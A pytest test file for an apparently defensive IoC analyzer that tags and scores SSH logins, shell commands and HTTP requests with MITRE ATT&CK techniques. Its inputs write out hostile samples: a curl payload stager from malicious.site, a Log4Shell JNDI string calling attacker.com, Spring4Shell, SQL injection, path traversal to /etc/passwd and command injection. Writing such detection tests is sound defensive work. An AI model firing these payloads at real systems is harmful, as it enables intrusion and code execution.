import pytest
from core.ioc_analyzer import IoCAnalyzer

def test_ssh_default_credentials():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_attempt("root", "toor")
    assert "DEFAULT_CREDENTIAL_ABUSE" in tags
    assert "ROOT_LOGIN_ATTEMPT" in tags
    assert score >= 70
    assert "T1078.001" in mitre

def test_ssh_malware_stager_detection():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_command("curl -O http://malicious.site/payload.sh && chmod +x payload.sh")
    assert "MALWARE_STAGER" in tags
    assert "INGRESS_TOOL_TRANSFER" in tags
    assert severity == "CRITICAL"
    assert "T1105" in mitre

def test_ssh_system_recon():
    tags, score, severity, mitre = IoCAnalyzer.analyze_ssh_command("uname -a && whoami")
    assert "SYSTEM_RECONNAISSANCE" in tags
    assert "T1082" in mitre

def test_http_sqli_analysis():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/products?id=1 UNION SELECT null, username, password FROM users--",
        headers={"user-agent": "sqlmap/1.5"}
    )
    assert any("SQL" in tag for tag in tags) or score >= 50
    assert severity in ["MEDIUM", "HIGH", "CRITICAL"]

def test_http_log4shell_analysis():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/",
        headers={"user-agent": "${jndi:ldap://attacker.com/exploit}"}
    )
    assert "LOG4SHELL" in tags or severity == "CRITICAL"
    assert score >= 90

def test_http_path_traversal():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/static/../../etc/passwd",
        headers={"user-agent": "curl/7.88.1"}
    )
    assert "PATH_TRAVERSAL" in tags
    assert "T1083" in mitre or "T1005" in mitre or severity in ["HIGH", "CRITICAL"]
    assert score >= 70

def test_http_credential_hunting():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="GET",
        path="/.env",
        headers={"user-agent": "Mozilla/5.0"}
    )
    assert "CREDENTIAL_HUNTING" in tags
    assert "T1083" in mitre

def test_http_spring4shell_analysis():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="POST",
        path="/helloworld",
        headers={"content-type": "application/x-www-form-urlencoded"},
        body="class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
    )
    assert "SPRING4SHELL" in tags
    assert severity == "CRITICAL"
    assert "T1190" in mitre

def test_http_rce_command_injection():
    tags, score, severity, mitre = IoCAnalyzer.analyze_http_request(
        method="POST",
        path="/cgi-bin/test.cgi",
        headers={"user-agent": "Mozilla/5.0"},
        body="ip=127.0.0.1; whoami"
    )
    assert "COMMAND_INJECTION" in tags
    assert "T1059" in mitre